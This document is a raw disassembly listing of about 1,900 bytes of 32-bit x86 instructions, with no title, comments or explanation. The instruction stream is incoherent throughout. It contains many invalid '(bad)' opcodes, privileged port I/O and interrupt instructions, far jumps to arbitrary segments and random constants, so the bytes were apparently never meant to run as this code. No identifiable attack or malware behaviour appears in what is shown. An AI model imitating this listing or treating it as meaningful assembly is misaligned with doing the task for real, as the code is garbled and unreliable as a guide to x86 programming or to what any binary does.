  407adf:	push   esp
  407ae0:	popa   
  407ae1:	add    al,0xa6
  407ae3:	xchg   edi,eax
  407ae4:	pushf  
  407ae5:	mov    ebp,0xbe408448
  407aea:	in     eax,0xf9
  407aec:	pop    edi
  407aed:	daa    
  407aee:	push   cs
  407aef:	pushf  
  407af0:	jle    0x407aad
  407af2:	jecxz  0x407b0a
  407af4:	mov    cl,0x44
  407af6:	dec    edi
  407af7:	jmp    0x190d:0x10b0df9a
  407afe:	mov    ch,BYTE PTR [edi+0x2b52395]
  407b04:	pop    ebx
  407b05:	add    BYTE PTR [ebp-0x16],0x9c
  407b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b0a:	stos   BYTE PTR es:[edi],al
  407b0b:	ds mov dh,0xcd
  407b0e:	stos   BYTE PTR es:[edi],al
  407b0f:	(bad)  
  407b10:	sub    al,0xad
  407b12:	sti    
  407b13:	dec    eax
  407b14:	retf   
  407b15:	mov    al,ds:0x34a3fe17
  407b1a:	jae    0x407b4d
  407b1c:	lds    esi,FWORD PTR [edx]
  407b1e:	adc    ebp,DWORD PTR [eax]
  407b20:	int3   
  407b21:	sar    al,0xca
  407b24:	aam    0xd4
  407b26:	sbb    eax,0x430355dc
  407b2b:	sbb    al,0x18
  407b2d:	push   esi
  407b2f:	xchg   ebp,eax
  407b30:	cmp    eax,0x3bca15ca
  407b35:	sub    al,BYTE PTR [edx+0x43b873a7]
  407b3b:	pop    edx
  407b3c:	xlat   BYTE PTR ds:[ebx]
  407b3d:	mov    cs,WORD PTR [ebx-0x28]
  407b40:	dec    esp
  407b41:	shl    dh,cl
  407b43:	mov    ebp,0x3157e26c
  407b48:	sub    al,0x8e
  407b4a:	scas   eax,DWORD PTR es:[edi]
  407b4b:	xchg   edx,eax
  407b4c:	(bad)  [esi]
  407b4e:	inc    edx
  407b4f:	ror    DWORD PTR [ebp+0x744ba92],1
  407b55:	mov    ecx,es
  407b57:	(bad)  
  407b58:	cmp    al,0x59
  407b5a:	mov    ch,0xa5
  407b5c:	aad    0x40
  407b5e:	int3   
  407b5f:	mov    bh,0x2
  407b61:	pop    eax
  407b62:	cwde   
  407b63:	xchg   ebx,eax
  407b64:	and    eax,0x71bd93e6
  407b69:	pop    esi
  407b6a:	mov    ecx,ecx
  407b6c:	mov    eax,DWORD PTR [ebx+0x25]
  407b6f:	std    
  407b70:	mov    eax,ds:0x812de6b2
  407b75:	popf   
  407b76:	out    dx,al
  407b77:	fimul  DWORD PTR [ebp+0x730f9a06]
  407b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b7e:	out    0x84,eax
  407b80:	call   0x7ee0:0x55d1f3bb
  407b87:	fsubr  QWORD PTR [edx+0x37]
  407b8a:	inc    ebx
  407b8b:	dec    esi
  407b8c:	scas   al,BYTE PTR es:[edi]
  407b8d:	repz mov esi,0xa0aa734a
  407b93:	mov    esi,0x2b7c4ebb
  407b98:	sub    ch,al
  407b9a:	les    esp,FWORD PTR [ecx+ebp*4-0x3531dfc0]
  407ba1:	mov    esi,0x2fdd8d4e
  407ba6:	ret    
  407ba7:	jns    0x407bd2
  407ba9:	or     ebp,esp
  407bab:	xlat   BYTE PTR ds:[ebx]
  407bac:	xchg   edx,eax
  407bad:	add    esi,ecx
  407baf:	cwde   
  407bb0:	jno    0x407ba6
  407bb2:	and    eax,0x935803a6
  407bb7:	rcl    DWORD PTR ds:0x388b8d42,1
  407bbd:	aaa    
  407bbe:	addr16 sahf 
  407bc0:	xchg   ebx,eax
  407bc1:	dec    ebx
  407bc2:	xchg   esi,eax
  407bc3:	imul   esp,DWORD PTR [ebp-0x32],0x7b
  407bc7:	sub    BYTE PTR [ebx],ch
  407bc9:	aaa    
  407bca:	enter  0xe3d8,0x4a
  407bce:	inc    ebp
  407bcf:	pop    ss
  407bd0:	sbb    al,0xdc
  407bd2:	fucomip st,st(4)
  407bd4:	mov    edx,0x790160f0
  407bd9:	xchg   esi,eax
  407bda:	sbb    BYTE PTR [edx-0x66],dl
  407bdd:	ret    0x9fb7
  407be0:	shr    edi,1
  407be2:	in     eax,0xc1
  407be4:	jbe    0x407c35
  407be6:	inc    esi
  407be7:	adc    bl,cl
  407be9:	inc    esp
  407bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407beb:	adc    edi,DWORD PTR [eax-0x2da80047]
  407bf1:	jno    0x407c56
  407bf3:	adc    edi,DWORD PTR [ebx]
  407bf5:	pop    ebp
  407bf6:	(bad)  
  407bf7:	mov    DWORD PTR [edx-0x5ae00092],ecx
  407bfd:	xchg   ebp,eax
  407bfe:	add    esp,DWORD PTR [edi-0x619ffa97]
  407c04:	pop    ecx
  407c05:	xor    al,0x1
  407c07:	ret    
  407c08:	outs   dx,DWORD PTR ds:[esi]
  407c09:	sbb    al,0xb2
  407c0b:	sub    eax,0x7ed7aba4
  407c10:	shr    dh,cl
  407c12:	or     esi,ebx
  407c14:	pop    ebx
  407c15:	test   al,0x34
  407c17:	pop    edi
  407c18:	neg    DWORD PTR [esi+0x4598d76]
  407c1e:	int    0x1d
  407c20:	pop    ebp
  407c21:	pop    ds
  407c22:	dec    edi
  407c23:	sti    
  407c24:	add    edi,DWORD PTR ds:0x46685d96
  407c2a:	mov    edi,0xe2b7a114
  407c2f:	inc    edx
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0xe238b0e6,cl
  407c46:	mov    cl,0x6
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	dec    esi
  407c50:	mov    ebx,0xeba4d41
  407c55:	mul    DWORD PTR [ebp+0x72]
  407c58:	fwait
  407c59:	inc    edi
  407c5a:	das    
  407c5b:	je     0x407cb2
  407c5d:	pushf  
  407c5e:	push   ebp
  407c5f:	bound  esi,QWORD PTR [edx+eiz*2-0x7054f850]
  407c66:	mov    ds:0xe46f834a,eax
  407c6b:	xor    eax,0xa17f1701
  407c70:	cmp    DWORD PTR [edx],ebp
  407c72:	or     eax,0xd7c98d4e
  407c77:	mov    ecx,0x30c2fdfc
  407c7c:	pop    ecx
  407c7d:	ja     0x407c0a
  407c7f:	fstp   QWORD PTR ds:0xeb832be6
  407c85:	mov    eax,0xbd534a58
  407c8a:	mov    eax,0x11156855
  407c8f:	fild   DWORD PTR [edi-0x66]
  407c92:	inc    edi
  407c93:	push   es
  407c94:	rcl    DWORD PTR [eax],0x5d
  407c97:	ins    DWORD PTR es:[edi],dx
  407c98:	addr16 dec ebx
  407c9a:	inc    ecx
  407c9b:	pop    ebp
  407c9c:	xchg   ecx,eax
  407c9d:	imul   ecx,ebp,0x75
  407ca0:	popa   
  407ca1:	mov    ah,0x59
  407ca3:	icebp  
  407ca4:	add    BYTE PTR [esi-0x26],0x66
  407ca8:	and    eax,0x82daf882
  407cad:	push   0x3c6087a8
  407cb2:	sahf   
  407cb3:	(bad)  
  407cb4:	into   
  407cb5:	test   eax,0x305a247a
  407cba:	dec    esi
  407cbb:	cmp    cl,BYTE PTR ds:0x5bc2711f
  407cc1:	imul   BYTE PTR [esi]
  407cc3:	cmp    ebx,ebp
  407cc5:	mov    cl,0x67
  407cc7:	xor    esp,edx
  407cc9:	mov    al,0x7f
  407ccb:	push   esi
  407ccc:	xor    eax,0x640e8f5e
  407cd1:	cmp    DWORD PTR [edi-0x38],edx
  407cd4:	add    bh,dl
  407cd6:	xor    edi,ebp
  407cd8:	cmp    ecx,DWORD PTR [ebx]
  407cda:	or     bl,0xb9
  407cdd:	fdivr  DWORD PTR [eax-0x3119533c]
  407ce3:	sbb    DWORD PTR [esi],ecx
  407ce5:	pop    esp
  407ce6:	xchg   cl,dl
  407ce8:	and    BYTE PTR [eax+0x72deb4c5],bh
  407cee:	test   eax,0x38818729
  407cf3:	dec    ebp
  407cf4:	cli    
  407cf5:	mov    bl,0x34
  407cf7:	mov    ebp,0x7313a218
  407cfc:	xchg   BYTE PTR [esi-0x52323b0],al
  407d02:	inc    esi
  407d03:	xor    ah,BYTE PTR [ecx+0x6b000a23]
  407d09:	js     0x407caf
  407d0b:	psubb  mm1,QWORD PTR [eax-0x36dfbad1]
  407d12:	cli    
  407d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d14:	inc    ecx
  407d15:	or     dl,BYTE PTR ds:0x294cc705
  407d1b:	or     dl,BYTE PTR [ecx+0x4b3fafb6]
  407d21:	repz xchg ecx,eax
  407d23:	xchg   edx,eax
  407d24:	bound  ebx,QWORD PTR [edi]
  407d26:	add    al,0x5e
  407d28:	(bad)  
  407d29:	jl     0x407d39
  407d2b:	dec    esp
  407d2c:	dec    ecx
  407d2d:	stos   BYTE PTR es:[edi],al
  407d2e:	stc    
  407d2f:	push   ds
  407d30:	inc    ebx
  407d31:	push   ebx
  407d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d33:	mov    BYTE PTR [esi-0x14363419],0xea
  407d3a:	mov    esi,0x973b80c6
  407d3f:	dec    eax
  407d40:	int    0x7b
  407d42:	outs   dx,BYTE PTR ds:[esi]
  407d43:	movsx  ebp,BYTE PTR [esi-0x540f83fa]
  407d4a:	aad    0x7a
  407d4c:	fadd   DWORD PTR [esi+0x338262b2]
  407d52:	out    dx,al
  407d53:	or     DWORD PTR [edi-0x4e],edi
  407d56:	retf   0x1afd
  407d59:	int    0x50
  407d5b:	(bad)  
  407d5d:	add    BYTE PTR [ebp+0x10f0e572],0xe
  407d64:	hlt    
  407d65:	xchg   BYTE PTR [ebx-0xc],ch
  407d68:	push   edx
  407d69:	inc    ecx
  407d6a:	test   BYTE PTR [esi],dl
  407d6c:	jg     0x407d0d
  407d6e:	pop    ebp
  407d6f:	pop    eax
  407d70:	les    ecx,FWORD PTR [ecx]
  407d72:	xchg   ecx,eax
  407d73:	and    bl,cl
  407d75:	gs dec edx
  407d77:	out    dx,al
  407d78:	pop    edi
  407d79:	pop    esp
  407d7a:	push   edi
  407d7b:	mov    cl,0x66
  407d7d:	push   ebx
  407d7e:	cmp    esi,esp
  407d80:	adc    eax,0xe9116e94
  407d85:	mov    cl,0xbe
  407d87:	lea    esi,[ecx]
  407d89:	fld    DWORD PTR [ecx]
  407d8b:	mov    ds:0x180d93b,eax
  407d90:	fsubr  QWORD PTR [ebx]
  407d92:	cli    
  407d93:	jge    0x407d4e
  407d95:	sti    
  407d96:	std    
  407d97:	ins    DWORD PTR es:[edi],dx
  407d98:	adc    ecx,DWORD PTR [ebx+edi*2]
  407d9b:	sbb    al,BYTE PTR [ebx]
  407d9d:	sbb    DWORD PTR [eax],0x13
  407da0:	push   esp
  407da1:	or     edi,ebx
  407da3:	push   eax
  407da4:	dec    esi
  407da5:	(bad)  
  407da6:	cs clc 
  407da8:	or     BYTE PTR [ebp+ebp*2-0x46150319],dh
  407daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db0:	mov    bh,0x23
  407db2:	sub    ecx,ebx
  407db4:	push   0xeaaffcc0
  407db9:	imul   edx,esi,0xb2582fa2
  407dbf:	bound  edi,QWORD PTR [edx+0x27]
  407dc2:	stos   DWORD PTR es:[edi],eax
  407dc3:	popa   
  407dc4:	jo     0x407dc7
  407dc6:	(bad)  
  407dc7:	mov    dl,0x22
  407dc9:	xchg   ebx,eax
  407dca:	fisub  DWORD PTR [edx]
  407dcc:	dec    esi
  407dcd:	pop    edi
  407dce:	jge    0x407d5d
  407dd0:	mov    ds:0xf977cc7b,al
  407dd5:	inc    ebx
  407dd6:	daa    
  407dd7:	jle    0x407d7d
  407dd9:	mov    cl,BYTE PTR [edx-0x5d]
  407ddc:	pop    ecx
  407ddd:	ins    WORD PTR es:[edi],dx
  407ddf:	popf   
  407de0:	popf   
  407de1:	push   eax
  407de2:	push   ecx
  407de3:	add    al,0x92
  407de5:	(bad)  
  407de6:	retf   0x8a54
  407de9:	add    cl,BYTE PTR [esi]
  407deb:	das    
  407dec:	loope  0x407e0c
  407dee:	jp     0x407daa
  407df0:	and    eax,0x59d18db6
  407df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407df6:	cwde   
  407df7:	mov    WORD PTR [ebp+0x0],?
  407dfa:	iret   
  407dfb:	sbb    eax,0x36653989
  407e00:	call   DWORD PTR cs:[ecx+0x570d4f5b]
  407e07:	ins    DWORD PTR es:[edi],dx
  407e08:	fistp  WORD PTR [edx]
  407e0a:	loopne 0x407dff
  407e0c:	test   eax,eax
  407e0e:	jl     0x407e58
  407e10:	jmp    0x407e64
  407e12:	iret   
  407e13:	shl    BYTE PTR [ecx-0x45998892],0x73
  407e1a:	test   DWORD PTR [edi],ebp
  407e1c:	pop    eax
  407e1d:	adc    cl,bl
  407e1f:	jno    0x407e74
  407e21:	add    eax,0x431b0925
  407e26:	shl    bl,1
  407e28:	add    al,ah
  407e2a:	aas    
  407e2b:	(bad)  
  407e2c:	push   esp
  407e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e2e:	mov    dl,0x2
  407e30:	mov    esi,0xf744c928
  407e35:	adc    dl,BYTE PTR [edx+edx*8]
  407e38:	gs popf 
  407e3a:	xor    al,0x3f
  407e3c:	cdq    
  407e3d:	mov    ch,0x9
  407e3f:	loopne 0x407ebc
  407e41:	(bad)
  407e44:	cmc    
  407e45:	push   ecx
  407e46:	fwait
  407e47:	lahf   
  407e48:	mov    DWORD PTR [edi-0x32],esi
  407e4b:	rcl    ebx,1
  407e4d:	cld    
  407e4e:	sahf   
  407e4f:	stc    
  407e50:	out    dx,eax
  407e51:	faddp  st(5),st
  407e53:	push   ds
  407e54:	fstp   DWORD PTR [ebp-0x28]
  407e57:	fstp   DWORD PTR [edx+ebx*2+0x306b95df]
  407e5e:	and    bl,cl
  407e60:	adc    dl,BYTE PTR [eax*2-0x3e343eed]
  407e67:	sar    BYTE PTR [ecx+0x374fd09c],1
  407e6d:	std    
  407e6e:	adc    ebx,DWORD PTR [edi]
  407e70:	add    bh,BYTE PTR [ebx+0x252b4088]
  407e76:	push   eax
  407e77:	cmp    edi,DWORD PTR [ebp+0x5570682d]
  407e7d:	inc    ebp
  407e7e:	adc    al,0xf7
  407e80:	sub    al,0xbf
  407e82:	adc    BYTE PTR [eax],ch
  407e84:	ret    0xc4dd
  407e87:	push   ecx
  407e88:	add    esp,eax
  407e8a:	jb     0x407ef4
  407e8c:	xor    al,0x5
  407e8e:	shr    BYTE PTR [eax+0x58ec3003],0xec
  407e95:	pop    esi
  407e96:	jne    0x407e45
  407e98:	xchg   edi,eax
  407e99:	clc    
  407e9a:	xor    BYTE PTR [ecx-0xc7af70a],0x30
  407ea1:	cmp    edx,DWORD PTR [ecx]
  407ea3:	xchg   esi,eax
  407ea4:	aad    0x30
  407ea6:	add    eax,0xcd913703
  407eab:	cmp    ebx,DWORD PTR ds:0x74499ccc
  407eb1:	cdq    
  407eb2:	int    0x8b
  407eb4:	mov    eax,ds:0x7333c7a0
  407eb9:	ins    BYTE PTR es:[edi],dx
  407eba:	aad    0x96
  407ebc:	jno    0x407e71
  407ebe:	sub    dh,BYTE PTR ds:[edx]
  407ec1:	inc    edx
  407ec2:	daa    
  407ec3:	jnp    0x407f41
  407ec5:	cmp    edi,DWORD PTR [edi]
  407ec7:	push   ebx
  407ec8:	out    0x77,al
  407eca:	stc    
  407ecb:	int3   
  407ecc:	not    BYTE PTR [eax+ebx*4]
  407ecf:	or     BYTE PTR [esi-0xd],bh
  407ed2:	add    DWORD PTR [edi],0x85ad3c4a
  407ed8:	sbb    BYTE PTR [edi-0x49],0x6d
  407edc:	lods   al,BYTE PTR ds:[esi]
  407edd:	stos   BYTE PTR es:[edi],al
  407ede:	push   edx
  407edf:	cld    
  407ee0:	sbb    BYTE PTR [ebx+0x31],cl
  407ee3:	inc    ebp
  407ee4:	test   al,0x9f
  407ee6:	popf   
  407ee7:	dec    esp
  407ee8:	repz sahf 
  407eea:	or     BYTE PTR [edi],cl
  407eec:	sti    
  407eed:	xor    BYTE PTR [eax],dl
  407eef:	sub    edx,eax
  407ef1:	ret    0x3e34
  407ef4:	enter  0x91c0,0x93
  407ef8:	sub    eax,0xeec66e81
  407efd:	aam    0x7f
  407eff:	popa   
  407f00:	retf   0x9eb2
  407f03:	(bad)  
  407f04:	aad    0x5d
  407f06:	call   0xf7ac4e4d
  407f0b:	or     al,BYTE PTR ds:0xdabc6e20
  407f11:	mov    esi,0xe3a643bd
  407f16:	jecxz  0x407ea6
  407f18:	das    
  407f19:	lds    ecx,FWORD PTR [ecx]
  407f1b:	mov    ebx,0xb18e35c4
  407f20:	sbb    ah,BYTE PTR [eax-0x2]
  407f23:	scas   eax,DWORD PTR es:[edi]
  407f24:	mov    DWORD PTR [esi],esi
  407f26:	ss lahf 
  407f28:	xlat   BYTE PTR ds:[ebx]
  407f29:	xor    cl,BYTE PTR [ebp-0x238a2912]
  407f2f:	pop    esi
  407f30:	sub    al,0xa
  407f32:	in     eax,0xba
  407f34:	and    DWORD PTR [edx],esp
  407f36:	(bad)  
  407f37:	ins    DWORD PTR es:[edi],dx
  407f38:	jl     0x18a7700c
  407f3e:	mov    dl,0x5a
  407f40:	scas   eax,DWORD PTR es:[edi]
  407f41:	scas   al,BYTE PTR es:[edi]
  407f42:	arpl   WORD PTR [ebp+0xb21d37],ax
  407f48:	mov    BYTE PTR ds:0x6ce31550,ah
  407f4e:	inc    edx
  407f4f:	dec    ebx
  407f50:	push   DWORD PTR [esi]
  407f52:	sub    eax,0x4b92e53
  407f57:	push   edx
  407f58:	(bad)  
  407f59:	jae    0x407f6f
  407f5b:	push   cs
  407f5c:	xor    DWORD PTR [eax+ecx*8],ebp
  407f5f:	xchg   edi,eax
  407f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f61:	cmp    eax,0x1515f338
  407f66:	jae    0x407f35
  407f68:	push   edx
  407f69:	ret    0xad05
  407f6c:	mov    DWORD PTR [eax-0x69],ecx
  407f6f:	sub    eax,0x8b432d5e
  407f74:	dec    esp
  407f75:	xor    dl,BYTE PTR [eax]
  407f77:	adc    eax,0xaa982ea2
  407f7c:	mov    dl,0x6f
  407f7e:	retf   
  407f7f:	mov    dl,0x37
  407f81:	adc    ah,BYTE PTR [esi+eax*2-0x7b]
  407f85:	fwait
  407f86:	inc    ebp
  407f87:	aas    
  407f88:	add    eax,0x9af9b641
  407f8d:	or     eax,0xfe4a1835
  407f92:	pop    edi
  407f93:	add    ah,BYTE PTR [eax+0x16df252]
  407f99:	add    eax,0x327150fe
  407f9e:	dec    esp
  407f9f:	das    
  407fa0:	push   cs
  407fa1:	in     al,0x3b
  407fa3:	push   esi
  407fa4:	pop    edi
  407fa5:	xchg   edx,eax
  407fa6:	sbb    eax,0x26d9dbe
  407fab:	mov    al,ds:0x5e902e04
  407fb0:	jge    0x407f68
  407fb2:	inc    esi
  407fb3:	or     DWORD PTR [edx+edi*1],eax
  407fb6:	sar    esi,cl
  407fb8:	test   BYTE PTR [ebx-0x7bb251dd],cl
  407fbe:	inc    ebp
  407fbf:	and    BYTE PTR [edx-0x30],0x1f
  407fc3:	push   ss
  407fc4:	inc    esi
  407fc6:	fild   QWORD PTR [eax-0x15]
  407fc9:	dec    eax
  407fca:	leave  
  407fcb:	inc    ecx
  407fcc:	xchg   esp,eax
  407fcd:	test   BYTE PTR [ebp-0x37],0x7c
  407fd1:	jbe    0x407f6a
  407fd3:	pop    esi
  407fd4:	sub    BYTE PTR [edx+0x39],ah
  407fd7:	in     eax,dx
  407fd8:	or     cl,dh
  407fda:	aas    
  407fdb:	in     al,0xed
  407fdd:	or     BYTE PTR [edi+0x4a],dh
  407fe0:	adc    bh,cl
  407fe2:	sub    ch,0xe6
  407fe5:	fild   DWORD PTR [eax-0x66db87e7]
  407feb:	jno    0x407fcb
  407fed:	fsub   st,st(7)
  407fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ff0:	xchg   esi,eax
  407ff1:	mov    bl,0x42
  407ff3:	rcl    DWORD PTR [ebx+0x7bbec6de],cl
  407ff9:	jge    0x408050
  407ffb:	mov    ebp,0x64f06c80
  408000:	call   0x1d03:0x9d81fa1c
  408007:	inc    ebx
  408008:	mov    edx,0xed10e785
  40800d:	sbb    al,0xa5
  40800f:	push   0xffffffc5
  408011:	out    dx,al
  408012:	mov    al,0x4e
  408014:	mov    cl,0x48
  408016:	dec    ebp
  408017:	inc    ebx
  408018:	loope  0x40803c
  40801a:	shl    cl,cl
  40801c:	cwde   
  40801d:	mov    ah,0xd2
  40801f:	les    ecx,FWORD PTR [ebx+ebx*8-0x4b]
  408023:	lds    ebx,FWORD PTR [esi+0x22c2f2a2]
  408029:	shl    BYTE PTR [edi-0x7bfe7ef6],cl
  40802f:	cmp    edx,DWORD PTR [ebp-0xdcb3152]
  408035:	stos   BYTE PTR es:[edi],al
  408036:	sti    
  408037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408038:	ficomp WORD PTR [esi+0x55]
  40803b:	ret    
  40803c:	sub    al,0xa3
  40803e:	jle    0x407fd5
  408040:	pop    esp
  408041:	sub    eax,0x873383b5
  408046:	fcomp  QWORD PTR [esi]
  408048:	jge    0x408083
  40804a:	jne    0x40801c
  40804c:	sbb    ebp,DWORD PTR [edi-0x2f992846]
  408052:	cmp    al,0x76
  408054:	mov    edi,0xb542b3b4
  408059:	mov    esi,0x68570a93
  40805e:	push   edx
  40805f:	mov    ebx,0xae8ffdb8
  408064:	xor    eax,0x81dcac4
  408069:	and    BYTE PTR [ebx],dh
  40806b:	std    
  40806c:	pop    es
  40806d:	jmp    0x8bc7a085
  408072:	hlt    
  408073:	or     DWORD PTR [edi-0x1d63efb2],ecx
  408079:	shr    DWORD PTR [eax+0x7d],0x28
  40807d:	xchg   dl,cl
  40807f:	iret   
  408080:	cli    
  408081:	cdq    
  408082:	mov    ebx,0x4f3f9cce
  408087:	push   edx
  408088:	dec    ecx
  408089:	sub    BYTE PTR [edx+0xa59dce9],cl
  40808f:	call   0xc5be:0x55311902
  408096:	xor    al,0x69
  408098:	in     eax,0x70
  40809a:	lods   al,BYTE PTR ds:[esi]
  40809b:	push   esp
  40809c:	sbb    BYTE PTR [edi+0x60],0x17
  4080a0:	jle    0x4080d6
  4080a2:	or     bh,0x94
  4080a5:	fcmovnb st,st(2)
  4080a7:	push   cs
  4080a8:	lods   al,BYTE PTR ds:[esi]
  4080a9:	jns    0x4080e4
  4080ab:	fwait
  4080ac:	js     0x40810f
  4080ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080af:	xor    esi,DWORD PTR [esi]
  4080b1:	stc    
  4080b2:	fist   WORD PTR [ecx-0x16]
  4080b5:	adc    eax,DWORD PTR [edx+0x31]
  4080b8:	xor    eax,0x8cab4367
  4080bd:	stc    
  4080be:	mov    al,0xc7
  4080c0:	clc    
  4080c1:	or     BYTE PTR [ecx-0x3adb267f],bh
  4080c7:	inc    ebp
  4080c8:	ret    0x1a39
  4080cb:	and    BYTE PTR [edi+0x6d],ah
  4080ce:	adc    cl,BYTE PTR [edx]
  4080d0:	dec    ecx
  4080d1:	mov    ch,0xf4
  4080d3:	adc    eax,0x1b8d1b13
  4080d8:	jno    0x408084
  4080da:	loop   0x4080df
  4080dc:	dec    eax
  4080dd:	mov    DWORD PTR [ebx*1+0x7137d0a7],0x9f1407b3
  4080e8:	lahf   
  4080e9:	pop    edx
  4080ea:	jl     0x4080d9
  4080ec:	pop    ebx
  4080ed:	and    DWORD PTR [eax+ebp*4],edi
  4080f0:	xor    BYTE PTR [eax+0x2f],ah
  4080f3:	mov    eax,0x1836a5c4
  4080f8:	mov    ds:0xecc04101,eax
  4080fd:	jle    0x4080b7
  4080ff:	pop    ecx
  408100:	xchg   edx,eax
  408101:	repnz xchg esi,eax
  408103:	in     eax,dx
  408104:	iret   
  408105:	std    
  408106:	adc    DWORD PTR [ecx+0x68644bd4],edi
  40810c:	xchg   DWORD PTR [ecx+0x1a],ebx
  40810f:	jnp    0x4080c9
  408111:	push   0x2c5675b2
  408116:	out    dx,eax
  408117:	jne    0x4080e9
  408119:	inc    eax
  40811a:	xchg   DWORD PTR [edi-0x4b],esi
  40811d:	sbb    edi,DWORD PTR [esi]
  40811f:	fisubr WORD PTR [ebp+0x324096d2]
  408125:	cmp    DWORD PTR [ecx],ebp
  408127:	idiv   DWORD PTR [eax+eax*4]
  40812a:	mov    al,BYTE PTR [esp+edx*8-0x772448f4]
  408131:	and    eax,DWORD PTR [ebp-0x39]
  408134:	cs cdq 
  408136:	jge    0x408164
  408138:	ds jae 0x40817a
  40813b:	mov    edx,ecx
  40813d:	in     eax,dx
  40813e:	xchg   ecx,eax
  40813f:	push   ebx
  408140:	push   ds
  408141:	dec    esi
  408142:	jnp    0x40810c
  408144:	ins    DWORD PTR es:[edi],dx
  408145:	and    DWORD PTR [esi+0x58bef4fc],edx
  40814b:	aam    0x2a
  40814d:	(bad)  
  40814e:	outs   dx,DWORD PTR ds:[esi]
  40814f:	cmp    al,dh
  408151:	or     eax,0xd13c7076
  408156:	nop
  408157:	out    0xf2,al
  408159:	mov    ds:0xb80b19a3,al
  40815e:	and    al,0x12
  408160:	inc    esp
  408161:	int3   
  408162:	add    DWORD PTR [edx],0x6f40c66e
  408168:	jbe    0x40818b
  40816a:	mov    ecx,0x583efeda
  40816f:	xchg   DWORD PTR [edx],eax
  408171:	mov    eax,ds:0xbf1d58eb
  408176:	shl    BYTE PTR [eax+0x4e19433a],cl
  40817c:	fwait
  40817d:	xor    edx,DWORD PTR [ebx+0x6d100881]
  408183:	and    eax,0x6cac1704
  408188:	lahf   
  408189:	jne    0x4081c0
  40818b:	jae    0x408124
  40818d:	add    BYTE PTR [esi+0x22],0x17
  408191:	dec    esp
  408192:	jae    0x4081c4
  408194:	das    
  408195:	sbb    DWORD PTR [edx-0x39],eax
  408198:	pop    esp
  408199:	push   cs
  40819a:	inc    esp
  40819b:	jne    0x4081bb
  40819d:	test   al,0xcb
  40819f:	and    BYTE PTR [edx-0x9],cl
  4081a2:	(bad)  
  4081a3:	ss dec ecx
  4081a5:	out    dx,eax
  4081a6:	ds aas 
  4081a8:	imul   ecx,DWORD PTR [edx+0x5e],0x4d
  4081ac:	adc    DWORD PTR [ebx+0x1b],edi
  4081af:	jmp    0x4081e9
  4081b1:	gs push ebp
  4081b3:	(bad)  
  4081b4:	bnd jns 0x4081bb
  4081b7:	add    DWORD PTR [edx-0x26228c65],esp
  4081bd:	aam    0xb8
  4081bf:	stos   DWORD PTR es:[edi],eax
  4081c0:	xor    esi,DWORD PTR [ecx+0x55]
  4081c3:	retf   0x4b7a
  4081c6:	inc    edx
  4081c7:	sub    eax,0xb4bf0462
  4081cc:	and    DWORD PTR [eax],0x1cf90bed
  4081d2:	mov    eax,ds:0xc45a9eb3
  4081d7:	dec    esi
  4081d8:	out    dx,eax
  4081d9:	fwait
  4081da:	outs   dx,DWORD PTR ds:[esi]
  4081db:	xor    al,0x50
  4081dd:	lods   eax,DWORD PTR ds:[esi]
  4081de:	bound  ebx,QWORD PTR [esp+ecx*8]
  4081e1:	rcl    BYTE PTR [ebx],cl
  4081e3:	push   ds
  4081e4:	pop    edx
  4081e5:	xor    al,0x94
  4081e7:	dec    edx
  4081e8:	and    DWORD PTR [eax-0x3f],esi
  4081eb:	and    ebx,eax
  4081ed:	dec    esi
  4081ee:	and    BYTE PTR [ebp+0x276c70bb],bl
  4081f4:	cdq    
  4081f5:	sub    al,0x93
  4081f7:	add    dh,BYTE PTR [ebx-0x76]
  4081fa:	mov    eax,0x5a18f1ce
  4081ff:	fninit 
  408201:	in     eax,dx
  408202:	and    dh,BYTE PTR [ebp+0x4f28afda]
  408208:	adc    eax,0x85a0e305
  40820d:	dec    BYTE PTR [ecx]
  40820f:	inc    esi
  408210:	ins    DWORD PTR es:[edi],dx
  408211:	pop    ebx
  408212:	leave  
  408213:	mov    al,ds:0xc19561ed
  408218:	and    BYTE PTR [eax-0x65],cl
  40821b:	inc    esp
  40821c:	fwait
  40821d:	jno    0x40824e
  40821f:	ficomp DWORD PTR [edi-0x31]
  408222:	cmp    ah,BYTE PTR [ebp+0x3c81e62a]
  408228:	daa    
  408229:	ret    0x4bce
  40822c:	sub    dl,BYTE PTR [edx-0x51]
  40822f:	addr16 and al,0x89
  408232:	(bad)  
  408234:	scas   eax,DWORD PTR es:[edi]
  408235:	jo     0x4081ef
  408237:	ja     0x408205
  408239:	iret   
  40823a:	jne    0x408233
  40823c:	out    dx,al
  40823d:	mov    eax,0xc275c7f9
  408242:	out    dx,eax
  408243:	iret   
  408244:	dec    ebp
  408245:	pop    ebp
  408246:	mov    ah,0xe0
  408248:	(bad)  
  408249:	hlt    
  40824a:	int3   
  40824b:	pop    ss
  40824c:	push   es
  40824d:	and    esi,esp
  40824f:	push   es
  408250:	mov    esp,0xaba5adb2
  408255:	into   
  408256:	pop    edi
  408257:	lahf   
  408258:	xchg   DWORD PTR [esi],ebx
  40825a:	push   0xffffff92
  40825c:	and    DWORD PTR [ebx-0x7859c269],0x6f21bcc9
  408266:	dec    eax
  408267:	ds lahf 
  408269:	daa    
  40826a:	rcr    DWORD PTR [edx],0x2f
  40826d:	aaa    
  40826e:	pop    esi
  40826f:	scas   eax,DWORD PTR es:[edi]
  408270:	aas    
  408271:	cmp    eax,0xc0105a62
  408276:	ja     0x408205
  408278:	inc    esp
  408279:	std    
  40827a:	in     eax,dx
